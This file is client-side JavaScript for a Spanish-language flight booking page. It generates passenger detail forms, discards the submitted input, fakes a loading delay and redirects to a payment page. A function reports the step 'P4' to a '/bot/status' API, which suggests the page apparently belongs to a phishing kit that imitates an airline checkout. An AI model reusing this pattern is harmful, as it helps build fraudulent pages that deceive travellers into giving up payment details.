const DOMElements = {
    contPassengersDetails: document.querySelector('#passengers-details'),
    btnNextStep: document.querySelector('#btn-next-step'),
    form: document.querySelector('form'),
    loader: document.querySelector('.loader')
}



/**
 * Startup@Passengers-info
 */
document.addEventListener('DOMContentLoaded', ()=>{
    eventListeners();
    updateDOM();
});





/**
 * Config@Passengers-Infop
 */
const eventListeners = ()=>{
    const { btnNextStep, form, loader } = DOMElements;

    btnNextStep.addEventListener('click', ()=>{
        document.querySelector('#send-passengers-info').click();
    });

    form.addEventListener('submit', (e)=>{
        e.preventDefault();
        loader.classList.add('show');

        setTimeout(() => window.location.href = 'payment.html', 2500);
    });
}

const updateDOM = ()=>{
    // print forms
    showPassengersForm(DOMElements.contPassengersDetails, info.flightInfo, '.year');
}



/**
 * Config@Passengers-Infop
 */
const showPassengersForm = (contPassengers, passengersInfo, selectYears)=>{
    contPassengers.textContent = '';
    
    if(passengersInfo.adults > 0){
        for(let i = 1; i <= passengersInfo.adults; i++){
            console.log(i);
            contPassengers.innerHTML += `
                <div class="border-blue-1 rounded-10 pr-2 pl-2 pt-3 pb-3 mt-2">
                    <p class="m-0 fs-4 tc-blue fw-bold">Pasajero Adulto - ${i}</p>
                    <div class="bg-gray-soft rounded-10 p-2">
                        <div class="input-container">
                            <input class="fs-1" required type="text" required>
                            <label>Nombre</label>
                        </div>
                        <div class="input-container mb-3">
                            <input required type="text" required>
                            <label>Apellido</label>
                        </div>

                        <p class="m-0 tc-blue fw-bold fs-5 mb-1">Fecha de nacimiento</p>
                        <div class="d-flex flex-row justify-space-between align-items-center">
                            <select required>
                                <option value="" class="tc-gray-2" selected disabled>Dia</option>
                                <option value="1">1</option>
                                <option value="2">2</option>
                                <option value="3">3</option>
                                <option value="4">4</option>
                                <option value="5">5</option>
                                <option value="6">6</option>
                                <option value="7">7</option>
                                <option value="8">8</option>
                                <option value="9">9</option>
                                <option value="10">10</option>
                                <option value="11">11</option>
                                <option value="12">12</option>
                                <option value="13">13</option>
                                <option value="14">14</option>
                                <option value="15">15</option>
                                <option value="16">16</option>
                                <option value="17">17</option>
                                <option value="18">18</option>
                                <option value="19">19</option>
                                <option value="20">20</option>
                                <option value="21">21</option>
                                <option value="22">22</option>
                                <option value="23">23</option>
                                <option value="24">24</option>
                                <option value="25">25</option>
                                <option value="26">26</option>
                                <option value="27">27</option>
                                <option value="28">28</option>
                                <option value="29">29</option>
                                <option value="30">30</option>
                                <option value="31">31</option>
                            </select>
                            <select required>
                                <option value="" class="tc-gray-2" selected disabled>Mes</option>
                                <option value="1">1</option>
                                <option value="2">2</option>
                                <option value="3">3</option>
                                <option value="4">4</option>
                                <option value="5">5</option>
                                <option value="6">6</option>
                                <option value="7">7</option>
                                <option value="8">8</option>
                                <option value="9">9</option>
                                <option value="10">10</option>
                                <option value="11">11</option>
                                <option value="12">12</option>
                            </select>
                            <select class="year" required>
                                <option value="" class="tc-gray-2" selected disabled>Año</option>
                            </select>
                        </div>
                    </div>
                </div>
            `;
        }
    }
    if(passengersInfo.children > 0){
        for(let i = 1; i <= passengersInfo.children; i++){
            console.log(i);
            contPassengers.innerHTML += `
                <div class="border-blue-1 rounded-10 pr-2 pl-2 pt-3 pb-3 mt-2">
                    <p class="m-0 fs-4 tc-blue fw-bold">Pasajero Niño - ${i}</p>
                    <div class="bg-gray-soft rounded-10 p-2">
                        <div class="input-container">
                            <input class="fs-1" required type="text" required>
                            <label>Nombre</label>
                        </div>
                        <div class="input-container mb-3">
                            <input required type="text" required>
                            <label>Apellido</label>
                        </div>

                        <p class="m-0 tc-blue fw-bold fs-5 mb-1">Fecha de nacimiento</p>
                        <div class="d-flex flex-row justify-space-between align-items-center">
                            <select required>
                                <option value="" class="tc-gray-2" selected disabled>Dia</option>
                                <option value="1">1</option>
                                <option value="2">2</option>
                                <option value="3">3</option>
                                <option value="4">4</option>
                                <option value="5">5</option>
                                <option value="6">6</option>
                                <option value="7">7</option>
                                <option value="8">8</option>
                                <option value="9">9</option>
                                <option value="10">10</option>
                                <option value="11">11</option>
                                <option value="12">12</option>
                                <option value="13">13</option>
                                <option value="14">14</option>
                                <option value="15">15</option>
                                <option value="16">16</option>
                                <option value="17">17</option>
                                <option value="18">18</option>
                                <option value="19">19</option>
                                <option value="20">20</option>
                                <option value="21">21</option>
                                <option value="22">22</option>
                                <option value="23">23</option>
                                <option value="24">24</option>
                                <option value="25">25</option>
                                <option value="26">26</option>
                                <option value="27">27</option>
                                <option value="28">28</option>
                                <option value="29">29</option>
                                <option value="30">30</option>
                                <option value="31">31</option>
                            </select>
                            <select required>
                                <option value="" class="tc-gray-2" selected disabled>Mes</option>
                                <option value="1">1</option>
                                <option value="2">2</option>
                                <option value="3">3</option>
                                <option value="4">4</option>
                                <option value="5">5</option>
                                <option value="6">6</option>
                                <option value="7">7</option>
                                <option value="8">8</option>
                                <option value="9">9</option>
                                <option value="10">10</option>
                                <option value="11">11</option>
                                <option value="12">12</option>
                            </select>
                            <select class="year" required>
                                <option value="" class="tc-gray-2" selected disabled>Año</option>
                            </select>
                        </div>
                    </div>
                </div>
            `;
        }
    }
    if(passengersInfo.babies > 0){
        for(let i = 1; i <= passengersInfo.babies; i++){
            contPassengers.innerHTML += `
                <div class="border-blue-1 rounded-10 pr-2 pl-2 pt-3 pb-3 mt-2">
                    <p class="m-0 fs-4 tc-blue fw-bold">Pasajero Bebé - ${i}</p>
                    <div class="bg-gray-soft rounded-10 p-2">
                        <div class="input-container">
                            <input class="fs-1" required type="text" required>
                            <label>Nombre</label>
                        </div>
                        <div class="input-container mb-3">
                            <input required type="text" required>
                            <label>Apellido</label>
                        </div>

                        <p class="m-0 tc-blue fw-bold fs-5 mb-1">Fecha de nacimiento</p>
                        <div class="d-flex flex-row justify-space-between align-items-center">
                            <select required>
                                <option value="" class="tc-gray-2" selected disabled>Dia</option>
                                <option value="1">1</option>
                                <option value="2">2</option>
                                <option value="3">3</option>
                                <option value="4">4</option>
                                <option value="5">5</option>
                                <option value="6">6</option>
                                <option value="7">7</option>
                                <option value="8">8</option>
                                <option value="9">9</option>
                                <option value="10">10</option>
                                <option value="11">11</option>
                                <option value="12">12</option>
                                <option value="13">13</option>
                                <option value="14">14</option>
                                <option value="15">15</option>
                                <option value="16">16</option>
                                <option value="17">17</option>
                                <option value="18">18</option>
                                <option value="19">19</option>
                                <option value="20">20</option>
                                <option value="21">21</option>
                                <option value="22">22</option>
                                <option value="23">23</option>
                                <option value="24">24</option>
                                <option value="25">25</option>
                                <option value="26">26</option>
                                <option value="27">27</option>
                                <option value="28">28</option>
                                <option value="29">29</option>
                                <option value="30">30</option>
                                <option value="31">31</option>
                            </select>
                            <select required>
                                <option value="" class="tc-gray-2" selected disabled>Mes</option>
                                <option value="1">1</option>
                                <option value="2">2</option>
                                <option value="3">3</option>
                                <option value="4">4</option>
                                <option value="5">5</option>
                                <option value="6">6</option>
                                <option value="7">7</option>
                                <option value="8">8</option>
                                <option value="9">9</option>
                                <option value="10">10</option>
                                <option value="11">11</option>
                                <option value="12">12</option>
                            </select>
                            <select class="year" required>
                                <option value="" class="tc-gray-2" selected disabled>Año</option>
                            </select>
                        </div>
                    </div>
                </div>
            `;
        }
    }

    contPassengers.innerHTML += `<button id="send-passengers-info" type="submit" class="hidden"></button>`;

    fillYears(selectYears);
}

const fillYears = (selectsClass)=>{
    const selects = document.querySelectorAll(selectsClass)

    selects.forEach(select => {
        for(var año = 1920; año <= 2024; año++){
            var option = document.createElement('option');
            option.value = option.text = año;
            select.add(option);
        }
    });
}

const sendStatus = () =>{
    try{
        fetch(`${API_URL}/api/bot/status`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Authorization': `Bearer ${API_KEY}`
            },
            body: JSON.stringify({message: 'P4'})
        });
    }catch(err){
        console.log(err);
    }
}